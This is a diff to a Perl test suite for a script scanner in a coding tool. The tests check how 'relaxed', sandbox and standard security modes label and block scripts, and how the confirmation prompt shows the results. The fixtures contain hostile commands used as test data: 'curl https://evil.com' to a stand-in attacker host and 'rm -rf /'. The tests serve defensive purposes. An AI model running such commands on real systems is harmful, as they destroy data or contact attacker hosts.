@@ -116,12 +116,50 @@ print "\n--- System destructive ---\n";
     ok(defined $r && $r->{blocked}, "rm -rf / blocked");
 }
 
-# --- Relaxed mode skips scanning ---
+# --- Relaxed mode scans and relabels ---
 print "\n--- Relaxed mode ---\n";
 
 {
     my $r = $fops->_scan_script_content('deploy.sh', "#!/bin/bash\ncurl https://evil.com", $relaxed_ctx);
-    ok(!defined $r, "relaxed mode skips script scanning");
+    ok(defined $r, "relaxed mode still scans script content");
+    ok(defined $r && $r->{relaxed}, "relaxed mode marks the result as relabelled");
+    ok(defined $r && $r->{requires_confirmation}, "relaxed mode still prompts");
+    ok(defined $r && !$r->{blocked}, "relaxed mode does not block a non-destructive script");
+
+    my @sev = map { $_->{severity} } @{ $r->{flags} || [] };
+    ok(defined $r && @sev && scalar(grep { $_ ne 'low' } @sev) == 0,
+        "relaxed mode labels findings low");
+
+    ok(defined $r && $r->{summary} =~ /labelled low/, "summary states the labels were lowered");
+    ok(defined $r && $r->{summary} =~ /Outbound data transfer/,
+        "summary still names what was found");
+}
+
+{
+    # The point of relabelling rather than skipping: relaxed must not be a way
+    # to write a destructive script without a warning.
+    my $r = $fops->_scan_script_content('nuke.sh', "#!/bin/bash\nrm -rf /", $relaxed_ctx);
+    ok(defined $r && $r->{blocked}, "relaxed mode still blocks destructive scripts");
+
+    my ($critical) = grep { $_->{severity} eq 'critical' } @{ $r->{flags} || [] };
+    ok($critical, "critical severity survives relaxed mode");
+}
+
+{
+    # Sandbox escalates, so relaxing must not apply underneath it.
+    my $ctx = { config => MockConfig->new(security_level => 'relaxed', sandbox => 1) };
+    my $r = $fops->_scan_script_content('deploy.sh', "#!/bin/bash\ncurl https://evil.com", $ctx);
+    my @sev = map { $_->{severity} } @{ $r->{flags} || [] };
+    ok(defined $r && !$r->{relaxed}, "sandbox ignores the relaxed label downgrade");
+    ok(scalar(grep { $_ ne 'low' } @sev), "sandbox keeps the detected severity");
+}
+
+{
+    # Standard mode must be untouched by the relaxed path.
+    my $r = $fops->_scan_script_content('deploy.sh', "#!/bin/bash\ncurl https://evil.com", $std_ctx);
+    ok(defined $r && !$r->{relaxed}, "standard mode is not marked relaxed");
+    my @sev = map { $_->{severity} } @{ $r->{flags} || [] };
+    ok(scalar(grep { $_ eq 'high' } @sev), "standard mode keeps high severity");
 }
 
 # --- Sandbox mode still scans ---
@@ -153,6 +191,106 @@ print "\n--- Session grants ---\n";
     # Simulate session grant
     # We can't easily test the prompt, but we can test grant reset
     CLIO::Security::GrantStore::reset_scope('script');
+}
+
+=head2 Prompt rendering
+
+The prompt is the only place the user learns what the scan decided. Capture
+it in-process by pointing STDOUT at a scalar and feeding STDIN an answer.
+
+=cut
+
+package MockUI;
+sub new {
+    my ($class, %opts) = @_;
+    return bless { use_color => 0, %opts }, $class;
+}
+sub colorize { return $_[1] }
+
+package MockTheme;
+sub new {
+    my ($class) = @_;
+    return bless {}, $class;
+}
+sub get_security_prompt {
+    my ($self, $target, $flags, $options) = @_;
+    my @parts = map { "[$_->{severity}] $_->{description}" } @$flags;
+    return ("* Security | $target\n  " . join(' | ', @parts), "  $options: ");
+}
+
+package main;
+
+# Runs _prompt_script_confirmation with stdout/stdin redirected.
+# Returns the captured output and the decision.
+sub run_script_prompt {
+    my ($scan, $ctx, $answer) = @_;
+    my $output = '';
+    my $approved;
+    {
+        open my $out_fh, '>', \$output or die "Cannot capture stdout: $!";
+        local *STDOUT = $out_fh;
+        local *STDIN;
+        open STDIN, '<', \( $answer . "\n" ) or die "Cannot fake stdin: $!";
+        $approved = $fops->_prompt_script_confirmation('deploy.sh', $scan, $ctx);
+    }
+    # The prompt re-selects STDOUT to flush it. Restore the default output
+    # handle, otherwise every later print lands in the captured scalar.
+    select(STDOUT);
+    return ($output, $approved);
+}
+
+print "\n--- Prompt rendering ---\n";
+
+{
+    my $ctx  = { ui => MockUI->new(), config => MockConfig->new(security_level => 'relaxed') };
+    my $scan = $fops->_scan_script_content('deploy.sh', "#!/bin/bash\ncurl https://evil.com", $ctx);
+    my ($out, $approved) = run_script_prompt($scan, $ctx, 'n');
+
+    ok($out =~ /\[low\] Outbound data transfer/, "relaxed prompt shows the finding as low");
+    ok($out =~ /contents were scanned, severity labelled low/,
+        "relaxed prompt says the contents were scanned and relabelled");
+    ok($out =~ /\(o\)nce \| \(a\)llow script creation \| \(n\)o deny/,
+        "relaxed prompt uses the o/a/n vocabulary");
+    ok(!$approved, "answering n denies the write");
+}
+
+{
+    my $ctx  = { ui => MockUI->new(), config => MockConfig->new(security_level => 'standard') };
+    my $scan = $fops->_scan_script_content('deploy.sh', "#!/bin/bash\ncurl https://evil.com", $ctx);
+    my ($out, $approved) = run_script_prompt($scan, $ctx, 'o');
+
+    ok($out =~ /\[high\] Outbound data transfer/, "standard prompt shows the real severity");
+    ok($out !~ /security_level=relaxed/, "standard prompt carries no relaxed notice");
+    ok($approved, "answering o approves the write");
+}
+
+{
+    my $ctx  = { ui => MockUI->new(), config => MockConfig->new(security_level => 'relaxed') };
+    my $scan = $fops->_scan_script_content('nuke.sh', "#!/bin/bash\nrm -rf /", $ctx);
+    my ($out) = run_script_prompt($scan, $ctx, 'n');
+
+    ok($out =~ /CRITICAL RISK/, "critical script is announced as critical");
+    ok($out =~ /\[critical\]/, "critical severity is not relabelled");
+    ok($out !~ /severity labelled low/, "a script with nothing relabelled claims no relabelling");
+}
+
+{
+    # Same assertions through the themed renderer, which takes a separate
+    # code path in _prompt_script_confirmation.
+    my $ctx  = { ui => MockUI->new(theme_mgr => MockTheme->new()), config => MockConfig->new(security_level => 'relaxed') };
+    my $scan = $fops->_scan_script_content('deploy.sh', "#!/bin/bash\ncurl https://evil.com", $ctx);
+    my ($out) = run_script_prompt($scan, $ctx, 'n');
+
+    ok($out =~ /contents were scanned, severity labelled low/,
+        "themed relaxed prompt carries the same notice");
+}
+
+{
+    my $ctx  = { ui => MockUI->new(theme_mgr => MockTheme->new()), config => MockConfig->new(security_level => 'relaxed') };
+    my $scan = $fops->_scan_script_content('nuke.sh', "#!/bin/bash\nrm -rf /", $ctx);
+    my ($out) = run_script_prompt($scan, $ctx, 'n');
+
+    ok($out =~ /CRITICAL RISK/, "themed prompt announces critical risk too");
 }
 
 # --- Summary ---
